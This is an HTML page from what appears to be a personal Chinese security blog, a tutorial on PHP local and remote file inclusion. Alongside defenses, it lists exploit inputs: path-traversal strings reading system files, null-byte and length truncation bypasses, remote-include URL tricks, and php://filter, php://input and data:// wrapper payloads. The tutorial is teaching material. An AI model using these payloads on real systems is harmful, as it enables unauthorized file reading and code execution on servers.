@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html  lang="zh-CN" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="混口饭吃">
+  <link rel="icon" href="/img/logo.png">
+  <title>文件包含漏洞</title>
+  
+  
+  <meta property="og:title" content="文件包含漏洞">
+  
+  
+  <meta property="og:url" content="http://example.com/2022/02/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+  
+  
+  <meta property="og:img" content="/img/author.jpg">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2022-02-23">
+  <meta property="og:article:modified_time" content="2022-02-23">
+  <meta property="og:article:author" content="YiHua">
+  
+  
+  <meta property="og:article:tag" content="web安全">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/logo.png" alt="logo">
+      
+      <span class="navbar-logo-dsc">混口饭吃</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    首页
+    
+    </a>
+    
+    <a href="/archives" class="navbar-menu-item">
+    
+    归档
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于
+    
+    </a>
+    
+    <a href="/links" class="navbar-menu-item">
+    
+    友链
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      文件包含漏洞
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-02-23T14:43:38.707Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2022-02-23</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/文件包含漏洞/" class="post-meta-link">文件包含漏洞</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.5k 字</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/web安全/" class="post-meta-link">web安全</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h3 id="一：文件包含的原理"><a href="#一：文件包含的原理" class="headerlink" title="一：文件包含的原理"></a>一：文件包含的原理</h3><h5 id="1-漏洞利用函数"><a href="#1-漏洞利用函数" class="headerlink" title="1.漏洞利用函数"></a>1.漏洞利用函数</h5><table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">include()</td>
+<td align="center">找不到被包含的文件时只产生警告，脚本将继续执行</td>
+</tr>
+<tr>
+<td align="center">include_once()</td>
+<td align="center">该文件中的代码已经被包含，则不会再次包含</td>
+</tr>
+<tr>
+<td align="center">require()</td>
+<td align="center">找不到被包含的文件时只产生致命错误，并停止脚本</td>
+</tr>
+<tr>
+<td align="center">require_once()</td>
+<td align="center">该文件中的代码已经被包含，则不会再次包含</td>
+</tr>
+</tbody></table>
+<p>require()和include()函数的区别：</p>
+<p>使用require()函数包含文件时，只</p>
+<p>要程序执行，立即调用文件，而include()只有程序执行到该函数时才调用。</p>
+<p>其他用于包含的函数：</p>
+<p>hihlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()</p>
+<h5 id="2-文件包含经典代码"><a href="#2-文件包含经典代码" class="headerlink" title="2.文件包含经典代码"></a>2.文件包含经典代码</h5><pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<p>以上代码，对$_GET[‘filename’]参数没有经过严格的过滤，直接带入了include()函数，攻击者可以修改$_GET[‘filename’]的值，加载其他文件，执行非预期的操作，由此造成了文件包含漏洞</p>
+<h5 id="3-文件包含漏洞防御"><a href="#3-文件包含漏洞防御" class="headerlink" title="3.文件包含漏洞防御"></a>3.文件包含漏洞防御</h5><p>1.严格判断包含中的参数是否外部可控</p>
+<p>2.路径限制</p>
+<p>3.包含文件验证</p>
+<p>4.尽量不要使用动态包含，可以在需要包含的页面固定写好</p>
+<p>5.php中可以使用open_basedir配置限制访问</p>
+<p>6.过滤.、\、/等</p>
+<p>7.禁止服务器远程文件包含</p>
+<h3 id="二：文件包含漏洞利用"><a href="#二：文件包含漏洞利用" class="headerlink" title="二：文件包含漏洞利用"></a>二：文件包含漏洞利用</h3><h4 id="1-文件包含漏洞的概述"><a href="#1-文件包含漏洞的概述" class="headerlink" title="1.文件包含漏洞的概述"></a>1.文件包含漏洞的概述</h4><p>分类</p>
+<p>•主要包括本地文件包含(LFI)和远程文件包含(RFI)两种形式。</p>
+<p>•简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含（HTTT,FTP,PHP伪协议）就是可以远程加载文件。</p>
+<p>相关配置</p>
+<p>•allow_url_fopen=On/Off—是否允许打开URL文件，该选项为on便是允许包含URL对象文件等。默认开启</p>
+<p>•allow_url_include=On/Off—是否允许引用URL文件，激活URL形式的fopen封装协议使得可以访问URL对象文件等。默认关闭</p>
+<h4 id="2-本地包含"><a href="#2-本地包含" class="headerlink" title="2.本地包含"></a>2.本地包含</h4><h5 id="1-本地包含的意思-LFI"><a href="#1-本地包含的意思-LFI" class="headerlink" title="1.本地包含的意思(LFI)"></a>1.本地包含的意思(LFI)</h5><p>指的是通过相对路径的方式能打开并包含本地文件的漏洞，大部分情</p>
+<p>况下遇到的文件包含漏洞都是LFI</p>
+<h5 id="2-包含条件"><a href="#2-包含条件" class="headerlink" title="2.包含条件"></a>2.包含条件</h5><p>•allow_url_fopen=On（php.ini中进行配置，该选项默认为On）</p>
+<p>•用户可以动态控制变量</p>
+<h5 id="3-无限制本地文件包含漏洞代码"><a href="#3-无限制本地文件包含漏洞代码" class="headerlink" title="3.无限制本地文件包含漏洞代码"></a>3.无限制本地文件包含漏洞代码</h5><pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<h5 id="4-无限制本地文件包含漏洞利用"><a href="#4-无限制本地文件包含漏洞利用" class="headerlink" title="4.无限制本地文件包含漏洞利用"></a>4.无限制本地文件包含漏洞利用</h5><p>1.获取到系统中的其他文件的内容</p>
+<p>绝对路径读取本地文件</p>
+<pre class="highlight"><span class="line">?action=C:\Windows\System32\drivers\etc\hosts</span><br></pre>
+
+<p>相对路径读取本地文件</p>
+<pre class="highlight"><span class="line">action=..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre>
+
+<p>2.包含图片木马</p>
+<p>利用文件包含漏洞直接包含图片木马</p>
+<pre class="highlight"><span class="line">/action.php?action=./est.jpg</span><br></pre>
+
+<h5 id="5-有限制本地文件包含漏洞绕过"><a href="#5-有限制本地文件包含漏洞绕过" class="headerlink" title="5.有限制本地文件包含漏洞绕过"></a>5.有限制本地文件包含漏洞绕过</h5><p>经典代码</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>.<span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<p>绕过方法</p>
+<p>1.%00截断</p>
+<p>条件：</p>
+<p>magic_quotes_gpc=Off，php版本&lt;5.3.4，获取phpinfo.php文件</p>
+<pre class="highlight"><span class="line">?action=phpinfo.php%<span class="number">00</span></span><br></pre>
+
+<p>2.路径长度截断</p>
+<p>条件：</p>
+<p>Windows下要长于256字节，超出的部分会被丢弃</p>
+<p>Linux下要长于4096字节，超出的部分会被丢弃。</p>
+<pre class="highlight"><span class="line">././././					<span class="comment">//长文件名截断	</span></span><br></pre>
+
+<p>3.点号截断</p>
+<p>条件：</p>
+<p>windows系统，点号需要长于256</p>
+<pre class="highlight"><span class="line">........					<span class="comment">//点截断</span></span><br></pre>
+
+<h4 id="3-远程文件包含"><a href="#3-远程文件包含" class="headerlink" title="3.远程文件包含"></a>3.远程文件包含</h4><h5 id="1-远程包含文件的意思"><a href="#1-远程包含文件的意思" class="headerlink" title="1.远程包含文件的意思"></a>1.远程包含文件的意思</h5><p>指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp等方式，远程加载文件</p>
+<h5 id="2-包含条件-1"><a href="#2-包含条件-1" class="headerlink" title="2.包含条件"></a>2.包含条件</h5><p>allow_url_include=On（默认为OFF，需要在php.ini中手动打开）</p>
+<p>allow_url_fopen=On（是否允许打开远程文件）</p>
+<p>用户可以动态控制变量</p>
+<h5 id="3-绕过方式"><a href="#3-绕过方式" class="headerlink" title="3.绕过方式"></a>3.绕过方式</h5><p>1.问好绕过</p>
+<pre class="highlight"><span class="line">?action=http:<span class="comment">//192.168.152.143/phpinfo.php?</span></span><br></pre>
+
+<p>2.#号绕过</p>
+<pre class="highlight"><span class="line">?action=http:<span class="comment">//192.168.152.143/phpinfo.php%23	//#号URL编码</span></span><br></pre>
+
+<p>3.空格绕过</p>
+<pre class="highlight"><span class="line">?action=http:<span class="comment">//192.168.152.143/phpinfo.php%20   //%20是空格</span></span><br></pre>
+
+<h5 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h5><p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220223215847075.png" alt="image-20220223215847075" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220223215847075.png" class="lozad post-image"></p>
+<h3 id="三：php为协议"><a href="#三：php为协议" class="headerlink" title="三：php为协议"></a>三：php为协议</h3><h5 id="1-php伪协议的用途"><a href="#1-php伪协议的用途" class="headerlink" title="1.php伪协议的用途"></a>1.php伪协议的用途</h5><table>
+<thead>
+<tr>
+<th align="center">伪协议</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file://</td>
+<td align="center">访问本地文件系统</td>
+</tr>
+<tr>
+<td align="center">http://</td>
+<td align="center">访问HTTP(s)网址</td>
+</tr>
+<tr>
+<td align="center">ftp://</td>
+<td align="center">访问FTP(s)URLS</td>
+</tr>
+<tr>
+<td align="center">php://</td>
+<td align="center">访问各个输入/输出流</td>
+</tr>
+<tr>
+<td align="center">zlib://</td>
+<td align="center">压缩流</td>
+</tr>
+<tr>
+<td align="center">data://</td>
+<td align="center">数据(RFC2397)</td>
+</tr>
+<tr>
+<td align="center">rar://</td>
+<td align="center">RAR</td>
+</tr>
+</tbody></table>
+<h5 id="2-三种常用的PHP伪协议详解"><a href="#2-三种常用的PHP伪协议详解" class="headerlink" title="2.三种常用的PHP伪协议详解"></a>2.三种常用的PHP伪协议详解</h5><h6 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="1.file://协议"></a>1.file://协议</h6><p>用途：访问本地系统文件</p>
+<p>使用条件：</p>
+<p>​                allow_url_fopen：off/on</p>
+<p>​                allow_url_include：off/on</p>
+<p>​                file://协议在两个配置都为off的情况下是可以正常使用的</p>
+<p>使用方法：file://文件的绝对路径和文件名</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220223221821392.png" alt="image-20220223221821392" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220223221821392.png" class="lozad post-image"></p>
+<h6 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2.php://filter"></a>2.php://filter</h6><p>用途：常用于读取文件/源码</p>
+<p>使用条件：</p>
+<p>​            allow_url_fopen：off/on</p>
+<p>​            allow_url_include：off/on</p>
+<p>​            两个配置都为off的情况下是可以正常使用的</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">[?path=php:<span class="comment">//filter/read=convert.base64-encode/resource=文件.php]</span></span><br></pre>
+
+<p>注意：通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。</p>
+<p>php://filter协议与file://协议的区别：file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议</p>
+<h6 id="3-php-input"><a href="#3-php-input" class="headerlink" title="3.php://input"></a>3.php://input</h6><p>用途：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代执行</p>
+<p>使用条件：</p>
+<p>​        allow_url_fopen：off/on</p>
+<p>​        allow_url_include：on</p>
+<p>使用方法：?file=php://input</p>
+<p>[POST]：&lt;?phpphpinfo()?&gt;(执行POSTDATA中的内容)PHP伪协议</p>
+<h6 id="4-zip"><a href="#4-zip" class="headerlink" title="4.zip://"></a>4.zip://</h6><p>使用条件：</p>
+<p>​        php版本&gt;=5.2</p>
+<p>​        allow_url_fopen：off/on</p>
+<p>​        allow_url_include：off/on</p>
+<p>用法：</p>
+<pre class="highlight"><span class="line">?file=zip:<span class="comment">//D:/soft/phpstudy/www/file.zip%23phpoode.txt</span></span><br></pre>
+
+<h6 id="5-compress-bzip2"><a href="#5-compress-bzip2" class="headerlink" title="5.compress.bzip2://"></a>5.compress.bzip2://</h6><p>使用条件：</p>
+<p>​        php版本&gt;=5.2</p>
+<p>​        allow_url_fopen：off/on</p>
+<p>​        allow_url_include：off/on</p>
+<p>用法：</p>
+<pre class="highlight"><span class="line">?file=compress.bzip2:<span class="comment">//D:/soft/phpstudy/www/file.bz2</span></span><br><span class="line">			<span class="comment">// or</span></span><br><span class="line">?file=compress.bzip2:<span class="comment">//../file.bz2</span></span><br></pre>
+
+<h6 id="6-compress-bzip"><a href="#6-compress-bzip" class="headerlink" title="6.compress.bzip://"></a>6.compress.bzip://</h6><p>使用条件：</p>
+<p>​        php版本&gt;=5.2</p>
+<p>​        allow_url_fopen：off/on</p>
+<p>​        allow_url_include：off/on</p>
+<p>用法：</p>
+<pre class="highlight"><span class="line">?file=compress.bzip:<span class="comment">//D:/soft/phpstudy/www/file.gz</span></span><br><span class="line">			<span class="comment">// or</span></span><br><span class="line">?file=compress.bzip:<span class="comment">//../file.gz</span></span><br></pre>
+
+<h6 id="7-data"><a href="#7-data" class="headerlink" title="7.data://"></a>7.data://</h6><p>使用条件：</p>
+<p>​        php版本&gt;=5.2</p>
+<p>​        allow_url_fopen：on</p>
+<p>​        allow_url_include：on</p>
+<p>用法：</p>
+<pre class="highlight"><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="comment">//or</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64.  </span></span><br></pre>
+
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">YiHua</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2022/02/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">http://example.com/2022/02/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  
+  <div class="nav-item-next">
+    <a href="/2022/02/23/文件上传漏洞/" class="nav-link">
+      <div>
+        <div class="nav-label">下一篇</div>
+        
+        <div class="nav-title">文件上传漏洞 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">一：文件包含的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">1.漏洞利用函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%8F%E5%85%B8%E4%BB%A3%E7%A0%81"><span class="toc-text">2.文件包含经典代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">3.文件包含漏洞防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">二：文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="toc-text">1.文件包含漏洞的概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-text">2.本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%9A%84%E6%84%8F%E6%80%9D-LFI"><span class="toc-text">1.本地包含的意思(LFI)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.包含条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-text">3.无限制本地文件包含漏洞代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.无限制本地文件包含漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">5.有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3.远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E6%84%8F%E6%80%9D"><span class="toc-text">1.远程包含文件的意思</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">2.包含条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">3.绕过方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Aphp%E4%B8%BA%E5%8D%8F%E8%AE%AE"><span class="toc-text">三：php为协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-text">1.php伪协议的用途</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%B8%89%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3"><span class="toc-text">2.三种常用的PHP伪协议详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-text">1.file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-php-filter"><span class="toc-text">2.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-php-input"><span class="toc-text">3.php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-zip"><span class="toc-text">4.zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-compress-bzip2"><span class="toc-text">5.compress.bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-compress-bzip"><span class="toc-text">6.compress.bzip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-data"><span class="toc-text">7.data:&#x2F;&#x2F;</span></a></li></ol></li></ol></li></ol></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/author.jpg" class="author-img">
+
+<p class="author-name">YiHua</p>
+<p class="author-description">谨言  深思  笃行</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>27</span>
+    <span>文章</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>10</span>
+    <span>分类</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>9</span>
+    <span>标签</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">一：文件包含的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">1.漏洞利用函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%8F%E5%85%B8%E4%BB%A3%E7%A0%81"><span class="toc-text">2.文件包含经典代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">3.文件包含漏洞防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">二：文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="toc-text">1.文件包含漏洞的概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-text">2.本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%9A%84%E6%84%8F%E6%80%9D-LFI"><span class="toc-text">1.本地包含的意思(LFI)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.包含条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-text">3.无限制本地文件包含漏洞代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.无限制本地文件包含漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span 